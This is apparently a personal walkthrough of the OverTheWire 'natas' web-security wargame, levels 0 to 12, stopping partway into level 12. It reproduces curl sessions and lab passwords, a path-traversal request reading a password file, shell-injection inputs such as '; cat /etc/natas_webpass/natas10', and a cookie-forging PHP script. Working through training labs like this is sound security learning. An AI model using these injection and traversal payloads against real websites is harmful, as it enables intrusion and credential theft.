# natas

natas is web based and involves attacking a website. The general format is the same as the other wargames with the username being natasN (N being a number ranging from 0 to the final level).

The games start at: http://natas0.natas.labs.overthewire.org/


## level 0

addres:   http://natas0.natas.labs.overthewire.org/
username: natas0
password: natas0

looking at the source HTML file I found the comment:

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->


## level 1

addres:   http://natas1.natas.labs.overthewire.org/
username: natas1
password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

hint: rightclicking is blocked

rightclicking was blocked (fun how they assume everyone is playing in a browser). I pressed control + shift + i and selected the sources tab, found the following comment:

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

## level 2

addres:   http://natas2.natas.labs.overthewire.org/
username: natas2
password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

hint: There is nothing on this page

Again checking the source I found a comment:
<!-- This stuff in the header has nothing to do with the level -->

thus I check the network requests, comparing to the prior page, I see that a pixel.png is request on the network

right below the hint I find:
```
<img src="files/pixel.png">
```

this is not in prior levels.

downloading it and running it trough various tools came up with nothing except, leading me to believe I'm overthinking this. So I navigate to /files/ and come across an index.

```
Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[IMG]	pixel.png	2016-12-15 16:07	303	 
[TXT]	users.txt	2016-12-20 05:15	145	 
```

contents of users.txt:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## level 3

addres:   http://natas3.natas.labs.overthewire.org/
username: natas3
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

hint: There is nothing on this page

Again checking the source I found a comment:
<!-- No more information leaks!! Not even Google will find it this time... -->

Nothing came up on google except solutions written by external parties.

requesting the page as if I'm coming from google doesn't change much either, nor does changing my useragent around:
```
curl http://natas3.natas.labs.overthewire.org/ -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 -H "Origin: https://google.com/" -A "google" --referer "https://google.com/index.html"                      
```

Using google "dorks" allowed me to find: http://natas3.natas.labs.overthewire.org/s3cr3t/

search:
site:http://natas3.natas.labs.overthewire.org

login was the same as natas3, after filling it in I was greeted with the following index:


```
Index of /s3cr3t
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[TXT]	users.txt	2016-12-20 05:15	40	 
```

users.txt:
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```


## level 4

addres:   http://natas4.natas.labs.overthewire.org/
username: natas4
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

hint: Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

okay so we just have to run curl with --referer "http://natas5.natas.labs.overthewire.org/" to get the password

```
❯ curl http://natas4.natas.labs.overthewire.org/ -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
easy c:

## level 5

addres:   http://natas5.natas.labs.overthewire.org/
username: natas5
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

note: using curl instead of a browser since level 4

```
❯ curl http://natas5.natas.labs.overthewire.org/ -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

nothing new here, diffing it with level 0 turned up nothing new either... time to check the request and response by using curl with -v (short for --verbose).


```
❯ curl http://natas5.natas.labs.overthewire.org/ -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -v              
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas5.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas5'
> GET / HTTP/1.1
> Host: natas5.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 11:42:44 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: loggedin=0
< Vary: Accept-Encoding
< Content-Length: 855
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
* Connection #0 to host natas5.natas.labs.overthewire.org left intact
```
we can see that there is a cookie set called loggedin=0, lets change that.

```
❯ curl http://natas5.natas.labs.overthewire.org/ -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -v -b "loggedin=1"
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas5.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas5'
> GET / HTTP/1.1
> Host: natas5.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: loggedin=1
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 11:44:42 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: loggedin=1
< Vary: Accept-Encoding
< Content-Length: 890
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
</html>
* Connection #0 to host natas5.natas.labs.overthewire.org left intact
```


## level 6

addres:   http://natas6.natas.labs.overthewire.org/
username: natas6
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

```
❯ curl http://natas6.natas.labs.overthewire.org/ -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -v                
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas6.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas6'
> GET / HTTP/1.1
> Host: natas6.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM2OmFHb1k0cTJEYzZNZ0RxNG9MNFl0b0t0eUFnOVBlSGEx
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 11:45:38 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Content-Length: 990
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas6.natas.labs.overthewire.org left intact
```

... okay lets get to that index-source.html

```
❯ curl http://natas6.natas.labs.overthewire.org/index-source.html -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -v
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas6.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas6'
> GET /index-source.html HTTP/1.1
> Host: natas6.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM2OmFHb1k0cTJEYzZNZ0RxNG9MNFl0b0t0eUFnOVBlSGEx
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 11:47:27 GMT
< Server: Apache/2.4.10 (Debian)
< Last-Modified: Tue, 20 Dec 2016 10:15:46 GMT
< ETag: "881-5441451cd5880"
< Accept-Ranges: bytes
< Content-Length: 2177
< Vary: Accept-Encoding
< Content-Type: text/html
< 
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br />&lt;?<br /><br />include&nbsp;"includes/secret.inc";<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(array_key_exists("submit",&nbsp;$_POST))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($secret&nbsp;==&nbsp;$_POST['secret'])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;";<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;"Wrong&nbsp;secret";<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />?&gt;<br /><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
* Connection #0 to host natas6.natas.labs.overthewire.org left intact
</code>%  
```
fun times, its minified c:

we can see that it gets a "secrets" file from includes/secret.inc, so lets grab that.

```
❯ curl http://natas6.natas.labs.overthewire.org/includes/secret.inc -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -v
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas6.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas6'
> GET /includes/secret.inc HTTP/1.1
> Host: natas6.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM2OmFHb1k0cTJEYzZNZ0RxNG9MNFl0b0t0eUFnOVBlSGEx
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 11:54:18 GMT
< Server: Apache/2.4.10 (Debian)
< Last-Modified: Thu, 15 Dec 2016 21:07:45 GMT
< ETag: "27-543b8d8450a40"
< Accept-Ranges: bytes
< Content-Length: 39
< 
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
* Connection #0 to host natas6.natas.labs.overthewire.org left intact
```

so: FOEIUWGHFEEUHOFUOIU
this secret is not the password for level 7 but rather allows us to get it

7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## level 7

addres:   http://natas7.natas.labs.overthewire.org/
username: natas7
password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

```
❯ curl http://natas7.natas.labs.overthewire.org/ -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 -v
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas7.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas7'
> GET / HTTP/1.1
> Host: natas7.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM3Ojd6M2hFRU5qUXRmbHpnblQyOXE3d0F2TU5mWmRoMGk5
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 11:58:28 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Content-Length: 982
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
* Connection #0 to host natas7.natas.labs.overthewire.org left intact
```

seeing that we are using PHP still, I guess we just gotta go to http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

which leads us to the password:
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe



## level 8

addres:   http://natas8.natas.labs.overthewire.org/
username: natas8
password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

```
❯ curl http://natas8.natas.labs.overthewire.org/ -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe -v
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas8.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas8'
> GET / HTTP/1.1
> Host: natas8.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM4OkRCZlVCZnFRRzY5S3ZKdkoxaUFiTW9JcHdTTlE5Yldl
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 12:01:37 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Content-Length: 990
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas8.natas.labs.overthewire.org left intact
```

again one with a GUI, so lets open it in the browser as well.

```<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

okay we just gotta decode it by running the 3 functions over it in reverse.
seeing that I'm lazy, I just threw it into an online PHP runner.

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
print(base64_decode(strrev((hex2bin($encodedSecret)))));
``` 

gets us an output of: oubWYf2kBq
which gets us the following:

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```


## level 9

addres:   http://natas9.natas.labs.overthewire.org/
username: natas9
password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

```
❯ curl http://natas9.natas.labs.overthewire.org/ -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -v
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas9.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas9'
> GET / HTTP/1.1
> Host: natas9.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM5OlcwbU1oVWNSUm5HOGRjZ2hFNHF2azNKQTlsR3Q4bkRs
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 12:10:26 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Content-Length: 1024
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas9.natas.labs.overthewire.org left intact
```

/view-source.html
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

They are using grep... seems like we just got ourselves a dumb terminal c: lets try realing out the file we want.
```
; cat /etc/natas_webpass/natas10; echo

Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
dictionary.txt
```


## level 10

addres:   http://natas10.natas.labs.overthewire.org/
username: natas10
password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

seeing that its the same shit as the last view times,lets just go to the source and look at that.

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

they now regex match for ; and &, we luckily do not need to use those as we can just get the contents of two files. Lets just get everything they have and input: "." /etc/natas_webpass/natas11

```
Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
...
```

natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK




## level 11

addres:   http://natas11.natas.labs.overthewire.org/
username: natas11
password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

well well
>>>> Cookies are protected with XOR encryption
lol

we get a form, anything we submit is put in a json string XOR encrypted, and base64 encoded.

default:
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSMX4MNzF%2BaAw%3D

altered:
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSFlkrEBZZaAw%3D

had to write a PHP script to solve this because of differences between langs, here is the final snippet

```
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSMX4MNzF+aAw=";

$abc = 'abcdefghijklmnopqrstuvwxyz0123456789_-^~=';

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';
    $privkey = 'qw8J';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $privkey[$i % strlen($privkey)];
    }

    return $outText;
}

$d = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

for ($x = 0; $x <= 1; $x++) {
  echo $x, $abc[$x], PHP_EOL;
  echo base64_encode(xor_encrypt(json_encode($d), $abc[$x])), PHP_EOL;
}

```

The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

## level 12 

addres:   http://natas12.natas.labs.overthewire.org/
username: natas12
password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

Another fucking PHP one.

```php
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas12</h1> 
<div id="content"> 
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
